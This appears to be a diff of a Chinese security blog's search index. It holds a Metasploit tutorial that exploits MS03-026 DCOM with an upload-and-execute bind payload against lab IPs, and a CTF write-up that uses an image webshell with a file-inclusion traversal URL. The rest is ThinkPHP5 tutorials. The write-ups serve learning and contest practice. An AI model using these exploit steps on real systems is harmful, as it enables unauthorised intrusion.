@@ -26,17 +26,18 @@
 <h3 id="auxiliary"><a href="#auxiliary" class="headerlink" title="auxiliary"></a>auxiliary</h3><p>负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块     </p>
 <h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><p>让我们举个例子来理解Metasploitpayload的使用。假设我们有一台易受DCOM MS03-026攻击的WindowsServer 2003计算机。</p>
 <p>首先，我们将搜索可以使用此漏洞的exp。我们将使用具有最佳RANK的漏洞利用。 </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">msf5 &gt; <span class="built_in">search</span> dcom</span><br><span class="line">~~~  </span><br><span class="line">![](http<span class="variable">s:</span>//i.imgur.<span class="keyword">com</span>/k3zDoiw.png)     </span><br><span class="line"></span><br><span class="line">再选择要使用的<span class="built_in">exp</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search dcom</span><br><span class="line"><span class="symbol">~~~   </span></span><br><span class="line"><span class="symbol">&lt;img src="https</span>:<span class="comment">//i.imgur.com/k3zDoiw.png"&gt;    </span></span><br><span class="line"></span><br><span class="line">再选择要使用的<span class="built_in">exp</span></span><br></pre></td></tr></table></figure>
 <p>msf5 &gt; use exploit/windows/dcerpc/ms03_026_dcom</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/TBnDynz.png)   </span></span><br><span class="line"></span><br><span class="line">然后我们使用下列命令来看看我们可以使用的payload</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/TBnDynz.png"</span>&gt;  </span><br><span class="line"></span><br><span class="line">然后我们使用下列命令来看看我们可以使用的payload</span><br></pre></td></tr></table></figure></div>
 <p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; show payloads</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/k3zDoiw.png)   </span></span><br><span class="line"></span><br><span class="line">看到列出的payload可以能帮助我们上传/执行文件，使沦陷的系统成为vnc服务器（能远程监视）   </span><br><span class="line"> </span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//i.imgur.com/7q6OI0e.png)  </span></span><br><span class="line"></span><br><span class="line">为了设置我们需要的payload，选择一个payload使用下列命令</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/k3zDoiw.png"</span>&gt;   </span><br><span class="line"></span><br><span class="line">看到列出的payload可以能帮助我们上传/执行文件，使沦陷的系统成为vnc服务器（能远程监视）   </span><br><span class="line"> </span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/7q6OI0e.png"</span>&gt;  </span><br><span class="line"></span><br><span class="line">为了设置我们需要的payload，选择一个payload使用下列命令</span><br></pre></td></tr></table></figure></div>
 <p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set PAYLOAD windows/upexec/bind_hidden_tcp</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">![]<span class="comment">(https://i.imgur.com/Q3bStZQ.png)</span>   </span><br><span class="line"></span><br><span class="line">设置监听主机和监听端口<span class="comment">(LHOST,LPORT)</span>,它们是攻击者的IP和端口。然后设置远程主机和端口<span class="comment">(RPORT,LHOST)</span>,它们是受害者IP和端口。</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">"https://i.imgur.com/Q3bStZQ.png"</span>&gt;   </span><br><span class="line"></span><br><span class="line">设置监听主机和监听端口(LHOST,LPORT),它们是攻击者的<span class="built_in">IP</span>和端口。然后设置远程主机和端口(RPORT,LHOST),它们是受害者<span class="built_in">IP</span>和端口。</span><br></pre></td></tr></table></figure></div>
 <p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set LHOST 192.168.56.134<br>LHOST =&gt; 192.168.56.134<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set LPORT 23524<br>LPORT =&gt; 23524<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set RPORT 135<br>RPORT =&gt; 135<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; set RHOST 192.168.56.146<br>RHOST =&gt; 192.168.56.146<br>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/U6NHEVX.png)</span></span><br><span class="line"></span><br><span class="line">输入“exploit”就会创建会话</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">"https://i.imgur.com/U6NHEVX.png"</span>&gt;</span><br><span class="line"></span><br><span class="line">输入“exploit”就会创建会话</span><br></pre></td></tr></table></figure></div>
 <p>msf5 exploit(windows/dcerpc/ms03_026_dcom) &gt; exploit</p>
-<pre><code>这里因为我使用的windows 2003 已经有该漏洞的补丁了，所以利用失败了
+<pre><code>
+这里因为我使用的windows 2003 已经有该漏洞的补丁了，所以利用失败了
 
 #### 原文链接：   
 
@@ -310,35 +311,6 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
-    <title>ISCC | What can images do</title>
-    <url>/undefined/%5BISCC%5DWhat%20can%20images%20do/</url>
-    <content><![CDATA[<h3 id="首先查看题目"><a href="#首先查看题目" class="headerlink" title="首先查看题目"></a>首先查看题目</h3><p><img src="https://i.imgur.com/VStF8zR.png" alt="">   </p>
-<p>尝试上传.php一句话   </p>
-<p>如图：   </p>
-<p><img src="https://i.imgur.com/ARa54YO.png" alt="">   </p>
-<p>尝试抓包更改文件名后缀名   </p>
-<p><img src="https://i.imgur.com/T0bYjsP.png" alt="">   </p>
-<p>尝试大小写绕过，00截断之后无果，猜测是对文件内容进行了检测。   </p>
-<p>尝试使用图片马绕过   </p>
-<p><img src="https://i.imgur.com/vIk0ccQ.png" alt="">   </p>
-<p>上传成功图片马   </p>
-<p>尝试使用apache解析漏洞连接蚁剑失败   </p>
-<p>后来得知使用文件包含   </p>
-<p><img src="https://i.imgur.com/pcnqgCY.png" alt="">    </p>
-<p>下面的图片存在文件包含漏洞   </p>
-<p>payload：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">101.201</span>.<span class="number">126.95</span>:<span class="number">7004</span>/?filename=../uploads/<span class="number">2020</span>/<span class="number">05</span>/<span class="number">07</span>/<span class="number">6432185</span>eb<span class="number">384</span><span class="keyword">c</span><span class="number">2</span><span class="keyword">c</span><span class="number">07</span>a<span class="number">8631382360</span>.jpg&amp;submit=<span class="symbol">%E6</span><span class="symbol">%8</span>F<span class="symbol">%90</span><span class="symbol">%E4</span><span class="symbol">%BA</span><span class="symbol">%A4</span></span><br></pre></td></tr></table></figure></div>
-<p>蚁剑连接得到flag<br><img src="https://i.imgur.com/gZQRTOW.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>WEB漏洞</category>
-        <category>文件上传漏洞</category>
-      </categories>
-      <tags>
-        <tag>图片马绕过 | 文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>客户端 session 导致的安全问题</title>
     <url>/undefined/%E5%AE%A2%E6%88%B7%E7%AB%AF%20session%20%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<p>在Web中，session是认证用户身份的凭证，它具备如下几个特点：  </p>
@@ -401,6 +373,46 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
+    <title>ISCC | What can images do</title>
+    <url>/undefined/%5BISCC%5DWhat%20can%20images%20do/</url>
+    <content><![CDATA[<h3 id="首先查看题目"><a href="#首先查看题目" class="headerlink" title="首先查看题目"></a>首先查看题目</h3><p><img src="https://i.imgur.com/VStF8zR.png" alt="">   </p>
+<p>尝试上传.php一句话   </p>
+<p>如图：   </p>
+<p><img src="https://i.imgur.com/ARa54YO.png" alt="">   </p>
+<p>尝试抓包更改文件名后缀名   </p>
+<p><img src="https://i.imgur.com/T0bYjsP.png" alt="">   </p>
+<p>尝试大小写绕过，00截断之后无果，猜测是对文件内容进行了检测。   </p>
+<p>尝试使用图片马绕过   </p>
+<p><img src="https://i.imgur.com/vIk0ccQ.png" alt="">   </p>
+<p>上传成功图片马   </p>
+<p>尝试使用apache解析漏洞连接蚁剑失败   </p>
+<p>后来得知使用文件包含   </p>
+<p><img src="https://i.imgur.com/pcnqgCY.png" alt="">    </p>
+<p>下面的图片存在文件包含漏洞   </p>
+<p>payload：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">101.201</span>.<span class="number">126.95</span>:<span class="number">7004</span>/?filename=../uploads/<span class="number">2020</span>/<span class="number">05</span>/<span class="number">07</span>/<span class="number">6432185</span>eb<span class="number">384</span><span class="keyword">c</span><span class="number">2</span><span class="keyword">c</span><span class="number">07</span>a<span class="number">8631382360</span>.jpg&amp;submit=<span class="symbol">%E6</span><span class="symbol">%8</span>F<span class="symbol">%90</span><span class="symbol">%E4</span><span class="symbol">%BA</span><span class="symbol">%A4</span></span><br></pre></td></tr></table></figure></div>
+<p>蚁剑连接得到flag<br><img src="https://i.imgur.com/gZQRTOW.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>WEB漏洞</category>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>图片马绕过 | 文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dockerfile创建数据卷</title>
+    <url>/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF | 2018护网杯(WEB)easy_tornado(模板注入)</title>
     <url>/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</url>
     <content><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src="https://i.imgur.com/zsu1I4d.png" alt="1"></p>
@@ -421,17 +433,6 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </categories>
       <tags>
         <tag>模板注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dockerfile创建数据卷</title>
-    <url>/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -476,29 +477,47 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
-    <title>12.thinkphp5视图之模板赋值和模板渲染</title>
-    <url>/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/</url>
-    <content><![CDATA[<h1 id="一丶视图之模板赋值和模板渲染"><a href="#一丶视图之模板赋值和模板渲染" class="headerlink" title="一丶视图之模板赋值和模板渲染"></a><font color=red>一丶视图之模板赋值和模板渲染</font></h1><h2 id="首先创建文件夹"><a href="#首先创建文件夹" class="headerlink" title="首先创建文件夹"></a><font color=green>首先创建文件夹</font></h2><p><img src="https://i.imgur.com/lu7oH89.png" alt="1"> </p>
-<h2 id="1丶视图实例化"><a href="#1丶视图实例化" class="headerlink" title="1丶视图实例化"></a><font color=green>1丶视图实例化</font></h2><p>视图由\think\View类配合试图驱动（模板引擎）类一起完成，目前的内置模板引擎包含PHP原生模板和think模板引擎；   </p>
-<p>因为新版的控制器可以无需继承任何的基础类，因此在控制器中如何使用视图决定于你怎么定义控制器。   </p>
-<h2 id="2丶继承-think-Controller类"><a href="#2丶继承-think-Controller类" class="headerlink" title="2丶继承\think\Controller类"></a><font color=green>2丶继承\think\Controller类</font></h2><p>如果你的控制器继承了\think\Controller类的话，则无需自己实例化视图类，可以直接调用控制器基础类封装的相关视图类的方法。<br>|下面的方法可以直接被调用|方法|<br>|  —- | —- |<br>|fetch|渲染模板输出|<br>|display|渲染内容输出|<br>|assign|模板变量赋值|<br>|engine|初始化模板引擎|</p>
-<h2 id="3丶模板赋值"><a href="#3丶模板赋值" class="headerlink" title="3丶模板赋值"></a><font color=green>3丶模板赋值</font></h2><p>除了系统变量和配置参数输出无需赋值外，其他变量如果需要在模板中输出必须首先进行模板赋值操作，绑定数据到模板输出有以下方式：   </p>
-<h2 id="assign方法"><a href="#assign方法" class="headerlink" title="assign方法"></a><font color=green>assign方法</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="code"><pre><span class="line">namespace index \appcontroller； </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">\think\Controller</span> </span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">function</span> <span class="title">index（）</span></span></span><br><span class="line"><span class="class"><span class="title">/模板变量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$name</span> <span class="title">=ThinkPHP：</span></span></span><br><span class="line"><span class="class"><span class="title">$eamil</span> <span class="title">=thinkphp@qq</span>.<span class="title">comi</span> </span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>'<span class="title">name</span>'<span class="title">，</span> <span class="title">$name</span> <span class="title">）</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（‘email’</span>,<span class="title">$email）</span></span></span><br><span class="line"><span class="class"><span class="title">//或者批量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>[</span></span><br><span class="line"><span class="class">        ‘name’ =&gt; $name </span></span><br><span class="line"><span class="class">          'email'=&gt;$email</span></span><br><span class="line"><span class="class">//模板输出</span></span><br><span class="line"><span class="class">return $this-&gt;fetch（'index'）；</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="4丶模板渲染"><a href="#4丶模板渲染" class="headerlink" title="4丶模板渲染"></a><font color=green>4丶模板渲染</font></h2><p>模板渲染最常用的是使用\think\View类的fetch方法，调用格式：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">fetch</span><span class="params">(<span class="string">'[模板文件]'</span>,[<span class="string">'模板变量（数组）'</span>])</span></span></span><br></pre></td></tr></table></figure></div>
-<p>模板文件的写法支持下面几种：<br>|用法|描述|<br>|——|————-|<br>|不带任何参数|自动定位当前操作的模板文件|<br>|模块[操作]|常用写法，支持跨模块|<br>|完整的模板文件名|直接使用完整的模板文件名(包括模板)|<br>下面是一个最典型的用法，不带任何参数：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不带任何参数，自动定位当前操作的模板文件</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch();</span><br></pre></td></tr></table></figure></div>
-<p>表示系统会按照默认规则自动定位模板文件，其规则是：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">当前模块/默认视图目录/当前控制器<span class="comment">(小写)</span>/当前操作<span class="comment">(小写)</span>.html;</span><br></pre></td></tr></table></figure></div>
-<p>可以在fetch方法里面去写对应的模板名，他会去当前控制器下面去找对应的模板文件；</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定模板输出</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'edit'</span>);</span><br></pre></td></tr></table></figure></div>
-<p>另外fetch方法支持跨模块的操作</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="code"><pre><span class="line">表示调用user控制器下面的user模板。</span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'user/user'</span>);</span><br></pre></td></tr></table></figure></div>
-<h3 id="调用方法："><a href="#调用方法：" class="headerlink" title="调用方法："></a>调用方法：</h3><p><img src="https://i.imgur.com/aKOSRYQ.png" alt="1"> </p>
-<h2 id="5丶传入参数方法"><a href="#5丶传入参数方法" class="headerlink" title="5丶传入参数方法"></a><font color=green>5丶传入参数方法</font></h2><p>方法fetch可以传入模板变量，例如：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">think\Controller</span> </span>&#123;</span><br><span class="line">        public function index()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> sthis-&gt;fetch(<span class="symbol">'inde</span>x'[</span><br><span class="line">                <span class="symbol">'nam</span>e'=&gt;<span class="symbol">'Think</span> <span class="type">PHP</span>', <span class="symbol">'emai</span>l'=&gt;<span class="symbol">'thinkphp</span><span class="meta">@qq</span>.com'</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<h2 id="6丶助手函数"><a href="#6丶助手函数" class="headerlink" title="6丶助手函数"></a><font color=green>6丶助手函数</font></h2><p>如果使用view助手函数渲染输出的话，可以使用下面的方法进行模板变量赋值：  </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> view(<span class="string">'index'</span>,[</span><br><span class="line">    <span class="string">'name'</span>=&gt;<span class="string">'thinkphp'</span>,</span><br><span class="line">    <span class="string">'email'</span>=&gt;<span class="string">'thinkphp<span class="subst">$qq</span>.com'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure></div>]]></content>
+    <title>13.thinkphp5模板系统变量输出和函数使用</title>
+    <url>/undefined/13.thinkphp5%E6%A8%A1%E6%9D%BF%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F%E8%BE%93%E5%87%BA%E5%92%8C%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="一丶模板系统变量输出和函数使用"><a href="#一丶模板系统变量输出和函数使用" class="headerlink" title="一丶模板系统变量输出和函数使用"></a><font color=red>一丶模板系统变量输出和函数使用</font></h1><h2 id="1丶系统变量输出"><a href="#1丶系统变量输出" class="headerlink" title="1丶系统变量输出"></a><font color=green>1丶系统变量输出</font></h2><p>普通的模板变量需要首先赋值之后才能在模板中输出，但是系统变量则不需要，可以直接在模板中输出，系统变量的输出通常以{$Think打头，例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PUPPET"><figure class="iseeu highlight /puppet"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$Think</span>, server, server_name&#125;//输出 <span class="variable">$_SERVER</span>[<span class="string">'SERVER_NAME'</span>]变量;</span><br><span class="line">&#123;<span class="variable">$Think</span>, session. user_id&#125;//输出<span class="variable">$_SESSION</span>[<span class="string">'user_id]变量;</span></span><br><span class="line"><span class="string">&#123;<span class="variable">$Think</span>,get.pageNumber&#125;//输出<span class="variable">$_GET</span>['</span>pageNumber]变量;</span><br><span class="line">&#123;<span class="variable">$Think</span>. cookie.name&#125;/输出<span class="variable">$_C0OKIE</span>[<span class="string">'name'</span>]变量;</span><br></pre></td></tr></table></figure></div>
+<p>支持输出$_SERVER丶$_ENV丶$_POST丶$_GET丶$_REQUEST丶$_SESSION和$_COOKIE变量。</p>
+<h2 id="2丶常量输出"><a href="#2丶常量输出" class="headerlink" title="2丶常量输出"></a><font color=green>2丶常量输出</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">&#123;$Think.<span class="keyword">const</span>.APP_PATH&#125;或者直接使用&#123;$Think.APP_PATH&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="3丶配置输出"><a href="#3丶配置输出" class="headerlink" title="3丶配置输出"></a><font color=green>3丶配置输出</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="REASONML"><figure class="iseeu highlight /reasonml"><table><tr><td class="code"><pre><span class="line">&#123;$<span class="module-access"><span class="module"><span class="identifier">Think</span>.</span></span>config.defaule_moudle&#125;</span><br><span class="line">&#123;$<span class="module-access"><span class="module"><span class="identifier">Think</span>.</span></span>config.default_controller&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="4丶使用函数"><a href="#4丶使用函数" class="headerlink" title="4丶使用函数"></a><font color=green>4丶使用函数</font></h2><p>我们往往需要对模板输出变量使用函数，可以使用：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">&#123;$<span class="keyword">data</span>.<span class="keyword">name</span>|md5&#125;</span><br></pre></td></tr></table></figure></div>
+<p>编译后的结果是：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (md5(data[name]));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+<p>如果函数有多个参数需要调用，则使用：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">&#123;$create_time|date=<span class="string">"y-m-d"</span>,###&#125;</span><br></pre></td></tr></table></figure></div>
+<p>表示date函数传入两个参数，每个参数用逗号分割，这里第一个参数是y-m-d，第二个参数是前面要输出的create time变量，因为该变量是第二个参数，因此需要用###标识变量位置，编译后的结果是：  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php echo(<span class="built_in">date</span>(y-m-d,<span class="built_in">create</span> <span class="built_in">time</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>还可以支持多个函数过滤，多个函数之间用““分割即可，例如:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COQ"><figure class="iseeu highlight /coq"><table><tr><td class="code"><pre><span class="line">($name|<span class="type">md5</span>|<span class="type">strtoupper</span>|<span class="type">substr</span>=<span class="number">0</span>,<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></div>
+<p>编译后的结果是：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (substr(strtoupper(md5($name)),<span class="number">0</span>,<span class="number">3</span>));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+<p>函数会按照从左到右的顺序依次调用。<br>如果你觉得这样写起来比较麻烦，也可以直接这样写：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLOJURE"><figure class="iseeu highlight /clojure"><table><tr><td class="code"><pre><span class="line">&#123;<span class="symbol">:substr</span>(<span class="name">strtoupper</span>(<span class="name">md5</span>($name)),<span class="number">0</span>,<span class="number">3</span>)&#125;</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>thinkphp5</category>
+      </categories>
+      <tags>
+        <tag>thinkphp5</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>11.thinkphp5模型操作之删除数据</title>
+    <url>/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/</url>
+    <content><![CDATA[<h1 id="一丶模型操作之删除数据"><a href="#一丶模型操作之删除数据" class="headerlink" title="一丶模型操作之删除数据"></a><font color=red>一丶模型操作之删除数据</font></h1><h2 id="1丶删除当前模型"><a href="#1丶删除当前模型" class="headerlink" title="1丶删除当前模型"></a><font color=green>1丶删除当前模型</font></h2><p>删除模型数据，可以实例化模型后调用delete方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = User::get(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;delete();</span><br></pre></td></tr></table></figure></div>
+<h2 id="2丶根据主键删除"><a href="#2丶根据主键删除" class="headerlink" title="2丶根据主键删除"></a><font color=green>2丶根据主键删除</font></h2><p>或者直接调用静态方法   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">User::destroy(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//支持删除多个数据</span></span><br><span class="line">User::destroy(<span class="string">'1,2,3'</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">User::destroy([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br></pre></td></tr></table></figure></div>
+<h2 id="3丶条件删除"><a href="#3丶条件删除" class="headerlink" title="3丶条件删除"></a><font color=green>3丶条件删除</font></h2><p>使用数组进行条件删除，例如：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除状态为0的数据</span></span><br><span class="line">User::destroy([<span class="string">'status'</span>=&gt;<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></div>
+<p>或者通过数据库类的查询条件删除</p>
